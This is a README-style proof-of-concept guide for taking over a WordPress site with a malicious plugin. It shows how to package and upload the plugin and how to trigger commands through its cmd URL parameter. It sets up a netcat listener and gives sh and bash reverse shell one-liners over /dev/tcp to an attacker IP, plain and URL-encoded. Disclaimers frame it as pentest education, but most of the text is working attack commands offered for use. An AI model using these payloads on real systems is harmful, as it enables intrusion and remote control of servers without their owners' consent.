# 🐚 Shell Plugin PoC — Remote Command Execution via WordPress Plugin

> **⚠️ DISCLAIMER:**  
> This project is for educational and authorized penetration testing purposes **only**. Do not deploy or use without proper consent. Unauthorized use may violate laws and terms of service.

* * *

## 📁 Plugin Creation Steps

```bash
# Create plugin directory
mkdir malicious_shell_plugin/
cd malicious_shell_plugin/

# Create the plugin file
sudo nano malicious-plugin.php
```

**Insert your plugin payload into `malicious-plugin.php`.**

Then:

```bash
# Make the plugin executable (optional for PoC)
cd ..
sudo chmod +x malicious-plugin.php

# Zip the plugin for upload or transfer
zip -r shell_plugin.zip malicious_shell_plugin/
```

* * *

## 📂 Plugin Deployment

Once the plugin is uploaded and activated via the WordPress admin panel (or directly dropped into the `/wp-content/plugins/` directory), verify its presence:

```
http://1337.codes/wp-content/plugins/shell_plugin/
```

* * *

## 🧪 Proof of Concept (Command Execution)

Execute a test command to verify RCE:

```
http://1337.codes/wp-content/plugins/shell_plugin/malicious-plugin.php?cmd=id
```

* * *

## 📡 Setting Up a Listener

On your **attacking machine**, set up a listener:

```bash
nc -lvnp 4444
```

* * *

## 🌀 Reverse Shell Payloads

Pick your desired shell from [RevShells](https://www.revshells.com/). Example (encoded for URL use):

### 🐚 `sh` Reverse Shell

```text
sh -i >& /dev/tcp/192.168.45.201/4444 0>&1
```

URL-encoded:

```
sh%20-i%20%3E%26%20/dev/tcp/192.168.45.201/4444%200%3E%261
```

### 💥 `bash` Reverse Shell

```text
bash -c "sh -i >& /dev/tcp/192.168.45.201/4444 0>&1"
```

URL-encoded:

```
bash%20-c%20"sh%20-i%20%3E%26%20/dev/tcp/192.168.45.201/4444%200%3E%261"
```

Trigger it via browser:

```
http://1337.codes/wp-content/plugins/shell_plugin/malicious-plugin.php?cmd=bash%20-c%20"sh%20-i%20%3E%26%20/dev/tcp/192.168.45.201/4444%200%3E%261"
```

* * *

## 🔒 Ethical Usage Reminder

This PoC is built for **red teaming, pentesting labs, and cybersecurity education**. Use responsibly and within authorized environments only.

* * *

## 🛠 Tools Used

- Netcat (`nc`)
- Custom WordPress plugin
- RevShells.com
- Linux CLI

* * *

## 🧠 About

This plugin demonstrates how weak input validation in custom plugins can lead to **Remote Code Execution (RCE)** on WordPress installations. Always validate inputs, sanitize user input, and follow least privilege principles.
